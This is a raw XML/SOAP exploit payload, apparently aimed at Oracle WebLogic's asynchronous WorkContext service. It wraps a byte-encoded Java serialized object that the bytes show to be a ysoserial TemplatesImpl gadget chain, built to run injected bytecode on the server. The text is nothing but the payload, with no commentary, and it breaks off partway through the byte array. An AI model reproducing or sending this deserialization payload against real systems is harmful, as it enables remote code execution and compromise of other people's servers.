<wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void> <array class=\"byte\" length=\"4346\"><void index=\"0\"><byte>-84</byte></void><void index=\"1\"><byte>-19</byte></void><void index=\"2\"><byte>0</byte></void><void index=\"3\"><byte>5</byte></void><void index=\"4\"><byte>115</byte></void><void index=\"5\"><byte>114</byte></void><void index=\"6\"><byte>0</byte></void><void index=\"7\"><byte>23</byte></void><void index=\"8\"><byte>106</byte></void><void index=\"9\"><byte>97</byte></void><void index=\"10\"><byte>118</byte></void><void index=\"11\"><byte>97</byte></void><void index=\"12\"><byte>46</byte></void><void index=\"13\"><byte>117</byte></void><void index=\"14\"><byte>116</byte></void><void index=\"15\"><byte>105</byte></void><void index=\"16\"><byte>108</byte></void><void index=\"17\"><byte>46</byte></void><void index=\"18\"><byte>76</byte></void><void index=\"19\"><byte>105</byte></void><void index=\"20\"><byte>110</byte></void><void index=\"21\"><byte>107</byte></void><void index=\"22\"><byte>101</byte></void><void index=\"23\"><byte>100</byte></void><void index=\"24\"><byte>72</byte></void><void index=\"25\"><byte>97</byte></void><void index=\"26\"><byte>115</byte></void><void index=\"27\"><byte>104</byte></void><void index=\"28\"><byte>83</byte></void><void index=\"29\"><byte>101</byte></void><void index=\"30\"><byte>116</byte></void><void index=\"31\"><byte>-40</byte></void><void index=\"32\"><byte>108</byte></void><void index=\"33\"><byte>-41</byte></void><void index=\"34\"><byte>90</byte></void><void index=\"35\"><byte>-107</byte></void><void index=\"36\"><byte>-35</byte></void><void index=\"37\"><byte>42</byte></void><void index=\"38\"><byte>30</byte></void><void index=\"39\"><byte>2</byte></void><void index=\"40\"><byte>0</byte></void><void index=\"41\"><byte>0</byte></void><void index=\"42\"><byte>120</byte></void><void index=\"43\"><byte>114</byte></void><void index=\"44\"><byte>0</byte></void><void index=\"45\"><byte>17</byte></void><void index=\"46\"><byte>106</byte></void><void index=\"47\"><byte>97</byte></void><void index=\"48\"><byte>118</byte></void><void index=\"49\"><byte>97</byte></void><void index=\"50\"><byte>46</byte></void><void index=\"51\"><byte>117</byte></void><void index=\"52\"><byte>116</byte></void><void index=\"53\"><byte>105</byte></void><void index=\"54\"><byte>108</byte></void><void index=\"55\"><byte>46</byte></void><void index=\"56\"><byte>72</byte></void><void index=\"57\"><byte>97</byte></void><void index=\"58\"><byte>115</byte></void><void index=\"59\"><byte>104</byte></void><void index=\"60\"><byte>83</byte></void><void index=\"61\"><byte>101</byte></void><void index=\"62\"><byte>116</byte></void><void index=\"63\"><byte>-70</byte></void><void index=\"64\"><byte>68</byte></void><void index=\"65\"><byte>-123</byte></void><void index=\"66\"><byte>-107</byte></void><void index=\"67\"><byte>-106</byte></void><void index=\"68\"><byte>-72</byte></void><void index=\"69\"><byte>-73</byte></void><void index=\"70\"><byte>52</byte></void><void index=\"71\"><byte>3</byte></void><void index=\"72\"><byte>0</byte></void><void index=\"73\"><byte>0</byte></void><void index=\"74\"><byte>120</byte></void><void index=\"75\"><byte>112</byte></void><void index=\"76\"><byte>119</byte></void><void index=\"77\"><byte>12</byte></void><void index=\"78\"><byte>0</byte></void><void index=\"79\"><byte>0</byte></void><void index=\"80\"><byte>0</byte></void><void index=\"81\"><byte>16</byte></void><void index=\"82\"><byte>63</byte></void><void index=\"83\"><byte>64</byte></void><void index=\"84\"><byte>0</byte></void><void index=\"85\"><byte>0</byte></void><void index=\"86\"><byte>0</byte></void><void index=\"87\"><byte>0</byte></void><void index=\"88\"><byte>0</byte></void><void index=\"89\"><byte>2</byte></void><void index=\"90\"><byte>115</byte></void><void index=\"91\"><byte>114</byte></void><void index=\"92\"><byte>0</byte></void><void index=\"93\"><byte>58</byte></void><void index=\"94\"><byte>99</byte></void><void index=\"95\"><byte>111</byte></void><void index=\"96\"><byte>109</byte></void><void index=\"97\"><byte>46</byte></void><void index=\"98\"><byte>115</byte></void><void index=\"99\"><byte>117</byte></void><void index=\"100\"><byte>110</byte></void><void index=\"101\"><byte>46</byte></void><void index=\"102\"><byte>111</byte></void><void index=\"103\"><byte>114</byte></void><void index=\"104\"><byte>103</byte></void><void index=\"105\"><byte>46</byte></void><void index=\"106\"><byte>97</byte></void><void index=\"107\"><byte>112</byte></void><void index=\"108\"><byte>97</byte></void><void index=\"109\"><byte>99</byte></void><void index=\"110\"><byte>104</byte></void><void index=\"111\"><byte>101</byte></void><void index=\"112\"><byte>46</byte></void><void index=\"113\"><byte>120</byte></void><void index=\"114\"><byte>97</byte></void><void index=\"115\"><byte>108</byte></void><void index=\"116\"><byte>97</byte></void><void index=\"117\"><byte>110</byte></void><void index=\"118\"><byte>46</byte></void><void index=\"119\"><byte>105</byte></void><void index=\"120\"><byte>110</byte></void><void index=\"121\"><byte>116</byte></void><void index=\"122\"><byte>101</byte></void><void index=\"123\"><byte>114</byte></void><void index=\"124\"><byte>110</byte></void><void index=\"125\"><byte>97</byte></void><void index=\"126\"><byte>108</byte></void><void index=\"127\"><byte>46</byte></void><void index=\"128\"><byte>120</byte></void><void index=\"129\"><byte>115</byte></void><void index=\"130\"><byte>108</byte></void><void index=\"131\"><byte>116</byte></void><void index=\"132\"><byte>99</byte></void><void index=\"133\"><byte>46</byte></void><void index=\"134\"><byte>116</byte></void><void index=\"135\"><byte>114</byte></void><void index=\"136\"><byte>97</byte></void><void index=\"137\"><byte>120</byte></void><void index=\"138\"><byte>46</byte></void><void index=\"139\"><byte>84</byte></void><void index=\"140\"><byte>101</byte></void><void index=\"141\"><byte>109</byte></void><void index=\"142\"><byte>112</byte></void><void index=\"143\"><byte>108</byte></void><void index=\"144\"><byte>97</byte></void><void index=\"145\"><byte>116</byte></void><void index=\"146\"><byte>101</byte></void><void index=\"147\"><byte>115</byte></void><void index=\"148\"><byte>73</byte></void><void index=\"149\"><byte>109</byte></void><void index=\"150\"><byte>112</byte></void><void index=\"151\"><byte>108</byte></void><void index=\"152\"><byte>9</byte></void><void index=\"153\"><byte>87</byte></void><void index=\"154\"><byte>79</byte></void><void index=\"155\"><byte>-63</byte></void><void index=\"156\"><byte>110</byte></void><void index=\"157\"><byte>-84</byte></void><void index=\"158\"><byte>-85</byte></void><void index=\"159\"><byte>51</byte></void><void index=\"160\"><byte>3</byte></void><void index=\"161\"><byte>0</byte></void><void index=\"162\"><byte>9</byte></void><void index=\"163\"><byte>73</byte></void><void index=\"164\"><byte>0</byte></void><void index=\"165\"><byte>13</byte></void><void index=\"166\"><byte>95</byte></void><void index=\"167\"><byte>105</byte></void><void index=\"168\"><byte>110</byte></void><void index=\"169\"><byte>100</byte></void><void index=\"170\"><byte>101</byte></void><void index=\"171\"><byte>110</byte></void><void index=\"172\"><byte>116</byte></void><void index=\"173\"><byte>78</byte></void><void index=\"174\"><byte>117</byte></void><void index=\"175\"><byte>109</byte></void><void index=\"176\"><byte>98</byte></void><void index=\"177\"><byte>101</byte></void><void index=\"178\"><byte>114</byte></void><void index=\"179\"><byte>73</byte></void><void index=\"180\"><byte>0</byte></void><void index=\"181\"><byte>14</byte></void><void index=\"182\"><byte>95</byte></void><void index=\"183\"><byte>116</byte></void><void index=\"184\"><byte>114</byte></void><void index=\"185\"><byte>97</byte></void><void index=\"186\"><byte>110</byte></void><void index=\"187\"><byte>115</byte></void><void index=\"188\"><byte>108</byte></void><void index=\"189\"><byte>101</byte></void><void index=\"190\"><byte>116</byte></void><void index=\"191\"><byte>73</byte></void><void index=\"192\"><byte>110</byte></void><void index=\"193\"><byte>100</byte></void><void index=\"194\"><byte>101</byte></void><void index=\"195\"><byte>120</byte></void><void index=\"196\"><byte>90</byte></void><void index=\"197\"><byte>0</byte></void><void index=\"198\"><byte>21</byte></void><void index=\"199\"><byte>95</byte></void><void index=\"200\"><byte>117</byte></void><void index=\"201\"><byte>115</byte></void><void index=\"202\"><byte>101</byte></void><void index=\"203\"><byte>83</byte></void><void index=\"204\"><byte>101</byte></void><void index=\"205\"><byte>114</byte></void><void index=\"206\"><byte>118</byte></void><void index=\"207\"><byte>105</byte></void><void index=\"208\"><byte>99</byte></void><void index=\"209\"><byte>101</byte></void><void index=\"210\"><byte>115</byte></void><void index=\"211\"><byte>77</byte></void><void index=\"212\"><byte>101</byte></void><void index=\"213\"><byte>99</byte></void><void index=\"214\"><byte>104</byte></void><void index=\"215\"><byte>97</byte></void><void index=\"216\"><byte>110</byte></void><void index=\"217\"><byte>105</byte></void><void index=\"218\"><byte>115</byte></void><void index=\"219\"><byte>109</byte></void><void index=\"220\"><byte>76</byte></void><void index=\"221\"><byte>0</byte></void><void index=\"222\"><byte>25</byte></void><void index=\"223\"><byte>95</byte></void><void index=\"224\"><byte>97</byte></void><void index=\"225\"><byte>99</byte></void><void index=\"226\"><byte>99</byte></void><void index=\"227\"><byte>101</byte></void><void index=\"228\"><byte>115</byte></void><void index=\"229\"><byte>115</byte></void><void index=\"230\"><byte>69</byte></void><void index=\"231\"><byte>120</byte></void><void index=\"232\"><byte>116</byte></void><void index=\"233\"><byte>101</byte></void><void index=\"234\"><byte>114</byte></void><void index=\"235\"><byte>110</byte></void><void index=\"236\"><byte>97</byte></void><void index=\"237\"><byte>108</byte></void><void index=\"238\"><byte>83</byte></void><void index=\"239\"><byte>116</byte></void><void index=\"240\"><byte>121</byte></void><void index=\"241\"><byte>108</byte></void><void index=\"242\"><byte>101</byte></void><void index=\"243\"><byte>115</byte></void><void index=\"244\"><byte>104</byte></void><void index=\"245\"><byte>101</byte></void><void index=\"246\"><byte>101</byte></void><void index=\"247\"><byte>116</byte></void><void index=\"248\"><byte>116</byte></void><void index=\"249\"><byte>0</byte></void><void index=\"250\"><byte>18</byte></void><void index=\"251\"><byte>76</byte></void><void index=\"252\"><byte>106</byte></void><void index=\"253\"><byte>97</byte></void><void index=\"254\"><byte>118</byte></void><void index=\"255\"><byte>97</byte></void><void index=\"256\"><byte>47</byte></void><void index=\"257\"><byte>108</byte></void><void index=\"258\"><byte>97</byte></void><void index=\"259\"><byte>110</byte></void><void index=\"260\"><byte>103</byte></void><void index=\"261\"><byte>47</byte></void><void index=\"262\"><byte>83</byte></void><void index=\"263\"><byte>116</byte></void><void index=\"264\"><byte>114</byte></void><void index=\"265\"><byte>105</byte></void><void index=\"266\"><byte>110</byte></void><void index=\"267\"><byte>103</byte></void><void index=\"268\"><byte>59</byte></void><void index=\"269\"><byte>76</byte></void><void index=\"270\"><byte>0</byte></void><void index=\"271\"><byte>11</byte></void><void index=\"272\"><byte>95</byte></void><void index=\"273\"><byte>97</byte></void><void index=\"274\"><byte>117</byte></void><void index=\"275\"><byte>120</byte></void><void index=\"276\"><byte>67</byte></void><void index=\"277\"><byte>108</byte></void><void index=\"278\"><byte>97</byte></void><void index=\"279\"><byte>115</byte></void><void index=\"280\"><byte>115</byte></void><void index=\"281\"><byte>101</byte></void><void index=\"282\"><byte>115</byte></void><void index=\"283\"><byte>116</byte></void><void index=\"284\"><byte>0</byte></void><void index=\"285\"><byte>59</byte></void><void index=\"286\"><byte>76</byte></void><void index=\"287\"><byte>99</byte></void><void index=\"288\"><byte>111</byte></void><void index=\"289\"><byte>109</byte></void><void index=\"290\"><byte>47</byte></void><void index=\"291\"><byte>115</byte></void><void index=\"292\"><byte>117</byte></void><void index=\"293\"><byte>110</byte></void><void index=\"294\"><byte>47</byte></void><void index=\"295\"><byte>111</byte></void><void index=\"296\"><byte>114</byte></void><void index=\"297\"><byte>103</byte></void><void index=\"298\"><byte>47</byte></void><void index=\"299\"><byte>97</byte></void><void index=\"300\"><byte>112</byte></void><void index=\"301\"><byte>97</byte></void><void index=\"302\"><byte>99</byte></void><void index=\"303\"><byte>104</byte></void><void index=\"304\"><byte>101</byte></void><void index=\"305\"><byte>47</byte></void><void index=\"306\"><byte>120</byte></void><void index=\"307\"><byte>97</byte></void><void index=\"308\"><byte>108</byte></void><void index=\"309\"><byte>97</byte></void><void index=\"310\"><byte>110</byte></void><void index=\"311\"><byte>47</byte></void><void index=\"312\"><byte>105</byte></void><void index=\"313\"><byte>110</byte></void><void index=\"314\"><byte>116</byte></void><void index=\"315\"><byte>101</byte></void><void index=\"316\"><byte>114</byte></void><void index=\"317\"><byte>110</byte></void><void index=\"318\"><byte>97</byte></void><void index=\"319\"><byte>108</byte></void><void index=\"320\"><byte>47</byte></void><void index=\"321\"><byte>120</byte></void><void index=\"322\"><byte>115</byte></void><void index=\"323\"><byte>108</byte></void><void index=\"324\"><byte>116</byte></void><void index=\"325\"><byte>99</byte></void><void index=\"326\"><byte>47</byte></void><void index=\"327\"><byte>114</byte></void><void index=\"328\"><byte>117</byte></void><void index=\"329\"><byte>110</byte></void><void index=\"330\"><byte>116</byte></void><void index=\"331\"><byte>105</byte></void><void index=\"332\"><byte>109</byte></void><void index=\"333\"><byte>101</byte></void><void index=\"334\"><byte>47</byte></void><void index=\"335\"><byte>72</byte></void><void index=\"336\"><byte>97</byte></void><void index=\"337\"><byte>115</byte></void><void index=\"338\"><byte>104</byte></void><void index=\"339\"><byte>116</byte></void><void index=\"340\"><byte>97</byte></void><void index=\"341\"><byte>98</byte></void><void index=\"342\"><byte>108</byte></void><void index=\"343\"><byte>101</byte></void><void index=\"344\"><byte>59</byte></void><void index=\"345\"><byte>91</byte></void><void index=\"346\"><byte>0</byte></void><void index=\"347\"><byte>10</byte></void><void index=\"348\"><byte>95</byte></void><void index=\"349\"><byte>98</byte></void><void index=\"350\"><byte>121</byte></void><void index=\"351\"><byte>116</byte></void><void index=\"352\"><byte>101</byte></void><void index=\"353\"><byte>99</byte></void><void index=\"354\"><byte>111</byte></void><void index=\"355\"><byte>100</byte></void><void index=\"356\"><byte>101</byte></void><void index=\"357\"><byte>115</byte></void><void index=\"358\"><byte>116</byte></void><void index=\"359\"><byte>0</byte></void><void index=\"360\"><byte>3</byte></void><void index=\"361\"><byte>91</byte></void><void index=\"362\"><byte>91</byte></void><void index=\"363\"><byte>66</byte></void><void index=\"364\"><byte>91</byte></void><void index=\"365\"><byte>0</byte></void><void index=\"366\"><byte>6</byte></void><void index=\"367\"><byte>95</byte></void><void index=\"368\"><byte>99</byte></void><void index=\"369\"><byte>108</byte></void><void index=\"370\"><byte>97</byte></void><void index=\"371\"><byte>115</byte></void><void index=\"372\"><byte>115</byte></void><void index=\"373\"><byte>116</byte></void><void index=\"374\"><byte>0</byte></void><void index=\"375\"><byte>18</byte></void><void index=\"376\"><byte>91</byte></void><void index=\"377\"><byte>76</byte></void><void index=\"378\"><byte>106</byte></void><void index=\"379\"><byte>97</byte></void><void index=\"380\"><byte>118</byte></void><void index=\"381\"><byte>97</byte></void><void index=\"382\"><byte>47</byte></void><void index=\"383\"><byte>108</byte></void><void index=\"384\"><byte>97</byte></void><void index=\"385\"><byte>110</byte></void><void index=\"386\"><byte>103</byte></void><void index=\"387\"><byte>47</byte></void><void index=\"388\"><byte>67</byte></void><void index=\"389\"><byte>108</byte></void><void index=\"390\"><byte>97</byte></void><void index=\"391\"><byte>115</byte></void><void index=\"392\"><byte>115</byte></void><void index=\"393\"><byte>59</byte></void><void index=\"394\"><byte>76</byte></void><void index=\"395\"><byte>0</byte></void><void index=\"396\"><byte>5</byte></void><void index=\"397\"><byte>95</byte></void><void index=\"398\"><byte>110</byte></void><void index=\"399\"><byte>97</byte></void><void index=\"400\"><byte>109</byte></void><void index=\"401\"><byte>101</byte></void><void index=\"402\"><byte>113</byte></void><void index=\"403\"><byte>0</byte></void><void index=\"404\"><byte>126</byte></void><void index=\"405\"><byte>0</byte></void><void index=\"406\"><byte>4</byte></void><void index=\"407\"><byte>76</byte></void><void index=\"408\"><byte>0</byte></void><void index=\"409\"><byte>17</byte></void><void index=\"410\"><byte>95</byte></void><void index=\"411\"><byte>111</byte></void><void index=\"412\"><byte>117</byte></void><void index=\"413\"><byte>116</byte></void><void index=\"414\"><byte>112</byte></void><void index=\"415\"><byte>117</byte></void><void index=\"416\"><byte>116</byte></void><void index=\"417\"><byte>80</byte></void><void index=\"418\"><byte>114</byte></void><void index=\"419\"><byte>111</byte></void><void index=\"420\"><byte>112</byte></void><void index=\"421\"><byte>101</byte></void><void index=\"422\"><byte>114</byte></void><void index=\"423\"><byte>116</byte></void><void index=\"424\"><byte>105</byte></void><void index=\"425\"><byte>101</byte></void><void index=\"426\"><byte>115</byte></void><void index=\"427\"><byte>116</byte></void><void index=\"428\"><byte>0</byte></void><void index=\"429\"><byte>22</byte></void><void index=\"430\"><byte>76</byte></void><void index=\"431\"><byte>106</byte></void><void index=\"432\"><byte>97</byte></void><void index=\"433\"><byte>118</byte></void><void index=\"434\"><byte>97</byte></void><void index=\"435\"><byte>47</byte></void><void index=\"436\"><byte>117</byte></void><void index=\"437\"><byte>116</byte></void><void index=\"438\"><byte>105</byte></void><void index=\"439\"><byte>108</byte></void><void index=\"440\"><byte>47</byte></void><void index=\"441\"><byte>80</byte></void><void index=\"442\"><byte>114</byte></void><void index=\"443\"><byte>111</byte></void><void index=\"444\"><byte>112</byte></void><void index=\"445\"><byte>101</byte></void><void index=\"446\"><byte>114</byte></void><void index=\"447\"><byte>116</byte></void><void index=\"448\"><byte>105</byte></void><void index=\"449\"><byte>101</byte></void><void index=\"450\"><byte>115</byte></void><void index=\"451\"><byte>59</byte></void><void index=\"452\"><byte>120</byte></void><void index=\"453\"><byte>112</byte></void><void index=\"454\"><byte>0</byte></void><void index=\"455\"><byte>0</byte></void><void index=\"456\"><byte>0</byte></void><void index=\"457\"><byte>0</byte></void><void index=\"458\"><byte>-1</byte></void><void index=\"459\"><byte>-1</byte></void><void index=\"460\"><byte>-1</byte></void><void index=\"461\"><byte>-1</byte></void><void index=\"462\"><byte>0</byte></void><void index=\"463\"><byte>116</byte></void><void index=\"464\"><byte>0</byte></void><void index=\"465\"><byte>3</byte></void><void index=\"466\"><byte>97</byte></void><void index=\"467\"><byte>108</byte></void><void index=\"468\"><byte>108</byte></void><void index=\"469\"><byte>112</byte></void><void index=\"470\"><byte>117</byte></void><void index=\"471\"><byte>114</byte></void><void index=\"472\"><byte>0</byte></void><void index=\"473\"><byte>3</byte></void><void index=\"474\"><byte>91</byte></void><void index=\"475\"><byte>91</byte></void><void index=\"476\"><byte>66</byte></void><void index=\"477\"><byte>75</byte></void><void index=\"478\"><byte>-3</byte></void><void index=\"479\"><byte>25</byte></void><void index=\"480\"><byte>21</byte></void><void index=\"481\"><byte>103</byte></void><void index=\"482\"><byte>103</byte></void><void index=\"483\"><byte>-37</byte></void><void index=\"484\"><byte>55</byte></void><void index=\"485\"><byte>2</byte></void><void index=\"486\"><byte>0</byte></void><void index=\"487\"><byte>0</byte></void><void index=\"488\"><byte>120</byte></void><void index=\"489\"><byte>112</byte></void><void index=\"490\"><byte>0</byte></void><void index=\"491\"><byte>0</byte></void><void index=\"492\"><byte>0</byte></void><void index=\"493\"><byte>2</byte></void><void index=\"494\"><byte>117</byte></void><void index=\"495\"><byte>114</byte></void><void index=\"496\"><byte>0</byte></void><void index=\"497\"><byte>2</byte></void><void index=\"498\"><byte>91</byte></void><void index=\"499\"><byte>66</byte></void><void index=\"500\"><byte>-84</byte></void><void index=\"501\"><byte>-13</byte></void><void index=\"502\"><byte>23</byte></void><void index=\"503\"><byte>-8</byte></void><void index=\"504\"><byte>6</byte></void><void index=\"505\"><byte>8</byte></void><void index=\"506\"><byte>84</byte></void><void index=\"507\"><byte>-32</byte></void><void index=\"508\"><byte>2</byte></void><void index=\"509\"><byte>0</byte></void><void index=\"510\"><byte>0</byte></void><void index=\"511\"><byte>120</byte></void><void index=\"512\"><byte>112</byte></void><void index=\"513\"><byte>0</byte></void><void index=\"514\"><byte>0</byte></void><void index=\"515\"><byte>11</byte></void><void index=\"516\"><byte>-123</byte></void><void index=\"517\"><byte>-54</byte></void><void index=\"518\"><byte>-2</byte></void><void index=\"519\"><byte>-70</byte></void><void index=\"520\"><byte>-66</byte></void><void index=\"521\"><byte>0</byte></void><void index=\"522\"><byte>0</byte></void><void index=\"523\"><byte>0</byte></void><void index=\"524\"><byte>50</byte></void><void index=\"525\"><byte>0</byte></void><void index=\"526\"><byte>81</byte></void><void index=\"527\"><byte>10</byte></void><void index=\"528\"><byte>0</byte></void><void index=\"529\"><byte>3</byte></void><void index=\"530\"><byte>0</byte></void><void index=\"531\"><byte>34</byte></void><void index=\"532\"><byte>7</byte></void><void index=\"533\"><byte>0</byte></void><void index=\"534\"><byte>79</byte></void><void index=\"535\"><byte>7</byte></void><void index=\"536\"><byte>0</byte></void><void index=\"537\"><byte>37</byte></void><void index=\"538\"><byte>7</byte></void><void index=\"539\"><byte>0</byte></void><void index=\"540\"><byte>38</byte></void><void index=\"541\"><byte>1</byte></void><void index=\"542\"><byte>0</byte></void><void index=\"543\"><byte>16</byte></void><void index=\"544\"><byte>115</byte></void><void index=\"545\"><byte>101</byte></void><void index=\"546\"><byte>114</byte></void><void index=\"547\"><byte>105</byte></void><void index=\"548\"><byte>97</byte></void><void index=\"549\"><byte>108</byte></void><void index=\"550\"><byte>86</byte></void><void index=\"551\"><byte>101</byte></void><void index=\"552\"><byte>114</byte></void><void index=\"553\"><byte>115</byte></void><void index=\"554\"><byte>105</byte></void><void index=\"555\"><byte>111</byte></void><void index=\"556\"><byte>110</byte></void><void index=\"557\"><byte>85</byte></void><void index=\"558\"><byte>73</byte></void><void index=\"559\"><byte>68</byte></void><void index=\"560\"><byte>1</byte></void><void index=\"561\"><byte>0</byte></void><void index=\"562\"><byte>1</byte></void><void index=\"563\"><byte>74</byte></void><void index=\"564\"><byte>1</byte></void><void index=\"565\"><byte>0</byte></void><void index=\"566\"><byte>13</byte></void><void index=\"567\"><byte>67</byte></void><void index=\"568\"><byte>111</byte></void><void index=\"569\"><byte>110</byte></void><void index=\"570\"><byte>115</byte></void><void index=\"571\"><byte>116</byte></void><void index=\"572\"><byte>97</byte></void><void index=\"573\"><byte>110</byte></void><void index=\"574\"><byte>116</byte></void><void index=\"575\"><byte>86</byte></void><void index=\"576\"><byte>97</byte></void><void index=\"577\"><byte>108</byte></void><void index=\"578\"><byte>117</byte></void><void index=\"579\"><byte>101</byte></void><void index=\"580\"><byte>5</byte></void><void index=\"581\"><byte>-83</byte></void><void index=\"582\"><byte>32</byte></void><void index=\"583\"><byte>-109</byte></void><void index=\"584\"><byte>-13</byte></void><void index=\"585\"><byte>-111</byte></void><void index=\"586\"><byte>-35</byte></void><void index=\"587\"><byte>-17</byte></void><void index=\"588\"><byte>62</byte></void><void index=\"589\"><byte>1</byte></void><void index=\"590\"><byte>0</byte></void><void index=\"591\"><byte>6</byte></void><void index=\"592\"><byte>60</byte></void><void index=\"593\"><byte>105</byte></void><void index=\"594\"><byte>110</byte></void><void index=\"595\"><byte>105</byte></void><void index=\"596\"><byte>116</byte></void><void index=\"597\"><byte>62</byte></void><void index=\"598\"><byte>1</byte></void><void index=\"599\"><byte>0</byte></void><void index=\"600\"><byte>3</byte></void><void index=\"601\"><byte>40</byte></void><void index=\"602\"><byte>41</byte></void><void index=\"603\"><byte>86</byte></void><void index=\"604\"><byte>1</byte></void><void index=\"605\"><byte>0</byte></void><void index=\"606\"><byte>4</byte></void><void index=\"607\"><byte>67</byte></void><void index=\"608\"><byte>111</byte></void><void index=\"609\"><byte>100</byte></void><void index=\"610\"><byte>101</byte></void><void index=\"611\"><byte>1</byte></void><void index=\"612\"><byte>0</byte></void><void index=\"613\"><byte>15</byte></void><void index=\"614\"><byte>76</byte></void><void index=\"615\"><byte>105</byte></void><void index=\"616\"><byte>110</byte></void><void index=\"617\"><byte>101</byte></void><void index=\"618\"><byte>78</byte></void><void index=\"619\"><byte>117</byte></void><void index=\"620\"><byte>109</byte></void><void index=\"621\"><byte>98</byte></void><void index=\"622\"><byte>101</byte></void><void index=\"623\"><byte>114</byte></void><void index=\"624\"><byte>84</byte></void><void index=\"625\"><byte>97</byte></void><void index=\"626\"><byte>98</byte></void><void index=\"627\"><byte>108</byte></void><void index=\"628\"><byte>101</byte></void><void index=\"629\"><byte>1</byte></void><void index=\"630\"><byte>0</byte></void><void index=\"631\"><byte>18</byte></void><void index=\"632\"><byte>76</byte></void><void index=\"633\"><byte>111</byte></void><void index=\"634\"><byte>99</byte></void><void index=\"635\"><byte>97</byte></void><void index=\"636\"><byte>108</byte></void><void index=\"637\"><byte>86</byte></void><void index=\"638\"><byte>97</byte></void><void index=\"639\"><byte>114</byte></void><void index=\"640\"><byte>105</byte></void><void index=\"641\"><byte>97</byte></void><void index=\"642\"><byte>98</byte></void><void index=\"643\"><byte>108</byte></void><void index=\"644\"><byte>101</byte></void><void index=\"645\"><byte>84</byte></void><void index=\"646\"><byte>97</byte></void><void index=\"647\"><byte>98</byte></void><void index=\"648\"><byte>108</byte></void><void index=\"649\"><byte>101</byte></void><void index=\"650\"><byte>1</byte></void><void index=\"651\"><byte>0</byte></void><void index=\"652\"><byte>4</byte></void><void index=\"653\"><byte>116</byte></void><void index=\"654\"><byte>104</byte></void><void index=\"655\"><byte>105</byte></void><void index=\"656\"><byte>115</byte></void><void index=\"657\"><byte>1</byte></void><void index=\"658\"><byte>0</byte></void><void index=\"659\"><byte>19</byte></void><void index=\"660\"><byte>83</byte></void><void index=\"661\"><byte>116</byte></void><void index=\"662\"><byte>117</byte></void><void index=\"663\"><byte>98</byte></void><void index=\"664\"><byte>84</byte></void><void index=\"665\"><byte>114</byte></void><void index=\"666\"><byte>97</byte></void><void index=\"667\"><byte>110</byte></void><void index=\"668\"><byte>115</byte></void><void index=\"669\"><byte>108</byte></void><void index=\"670\"><byte>101</byte></void><void index=\"671\"><byte>116</byte></void><void index=\"672\"><byte>80</byte></void><void index=\"673\"><byte>97</byte></void><void index=\"674\"><byte>121</byte></void><void index=\"675\"><byte>108</byte></void><void index=\"676\"><byte>111</byte></void><void index=\"677\"><byte>97</byte></void><void index=\"678\"><byte>100</byte></void><void index=\"679\"><byte>1</byte></void><void index=\"680\"><byte>0</byte></void><void index=\"681\"><byte>12</byte></void><void index=\"682\"><byte>73</byte></void><void index=\"683\"><byte>110</byte></void><void index=\"684\"><byte>110</byte></void><void index=\"685\"><byte>101</byte></void><void index=\"686\"><byte>114</byte></void><void index=\"687\"><byte>67</byte></void><void index=\"688\"><byte>108</byte></void><void index=\"689\"><byte>97</byte></void><void index=\"690\"><byte>115</byte></void><void index=\"691\"><byte>115</byte></void><void index=\"692\"><byte>101</byte></void><void index=\"693\"><byte>115</byte></void><void index=\"694\"><byte>1</byte></void><void index=\"695\"><byte>0</byte></void><void index=\"696\"><byte>53</byte></void><void index=\"697\"><byte>76</byte></void><void index=\"698\"><byte>121</byte></void><void index=\"699\"><byte>115</byte></void><void index=\"700\"><byte>111</byte></void><void index=\"701\"><byte>115</byte></void><void index=\"702\"><byte>101</byte></void><void index=\"703\"><byte>114</byte></void><void index=\"704\"><byte>105</byte></void><void index=\"705\"><byte>97</byte></void><void index=\"706\"><byte>108</byte></void><void index=\"707\"><byte>47</byte></void><void index=\"708\"><byte>112</byte></void><void index=\"709\"><byte>97</byte></void><void index=\"710\"><byte>121</byte></void><void index=\"711\"><byte>108</byte></void><void index=\"712\"><byte>111</byte></void><void index=\"713\"><byte>97</byte></void><void index=\"714\"><byte>100</byte></void><void index=\"715\"><byte>115</byte></void><void index=\"716\"><byte>47</byte></void><void index=\"717\"><byte>117</byte></void><void index=\"718\"><byte>116</byte></void><void index=\"719\"><byte>105</byte></void><void index=\"720\"><byte>108</byte></void><void index=\"721\"><byte>47</byte></void><void index=\"722\"><byte>71</byte></void><void index=\"723\"><byte>97</byte></void><void index=\"724\"><byte>100</byte></void><void index=\"725\"><byte>103</byte></void><void index=\"726\"><byte>101</byte></void><void index=\"727\"><byte>116</byte></void><void index=\"728\"><byte>115</byte></void><void index=\"729\"><byte>36</byte></void><void index=\"730\"><byte>83</byte></void><void index=\"731\"><byte>116</byte></void><void index=\"732\"><byte>117</byte></void><void index=\"733\"><byte>98</byte></void><void index=\"734\"><byte>84</byte></void><void index=\"735\"><byte>114</byte></void><void index=\"736\"><byte>97</byte></void><void index=\"737\"><byte>110</byte></void><void index=\"738\"><byte>115</byte></void><void index=\"739\"><byte>108</byte></void><void index=\"740\"><byte>101</byte></void><void index=\"741\"><byte>116</byte></void><void index=\"742\"><byte>80</byte></void><void index=\"743\"><byte>97</byte></void><void index=\"744\"><byte>121</byte></void><void index=\"745\"><byte>108</byte></void><void index=\"746\"><byte>111</byte></void><void index=\"747\"><byte>97</byte></void><void index=\"748\"><byte>100</byte></void><void index=\"749\"><byte>59</byte></void><void index=\"750\"><byte>1</byte></void><void index=\"751\"><byte>0</byte></void><void index=\"752\"><byte>9</byte></void><void index=\"753\"><byte>116</byte></void><void index=\"754\"><byte>114</byte></void><void index=\"755\"><byte>97</byte></void><void index=\"756\"><byte>110</byte></void><void index=\"757\"><byte>115</byte></void><void index=\"758\"><byte>102</byte></void><void index=\"759\"><byte>111</byte></void><void index=\"760\"><byte>114</byte></void><void index=\"761\"><byte>109</byte></void><void index=\"762\"><byte>1</byte></void><void index=\"763\"><byte>0</byte></void><void index=\"764\"><byte>114</byte></void><void index=\"765\"><byte>40</byte></void><void index=\"766\"><byte>76</byte></void><void index=\"767\"><byte>99</byte></void><void index=\"768\"><byte>111</byte></void><void index=\"769\"><byte>109</byte></void><void index=\"770\"><byte>47</byte></void><void index=\"771\"><byte>115</byte></void><void index=\"772\"><byte>117</byte></void><void index=\"773\"><byte>110</byte></void><void index=\"774\"><byte>47</byte></void><void index=\"775\"><byte>111</byte></void><void index=\"776\"><byte>114</byte></void><void index=\"777\"><byte>103</byte></void><void index=\"778\"><byte>47</byte></void><void index=\"779\"><byte>97</byte></void><void 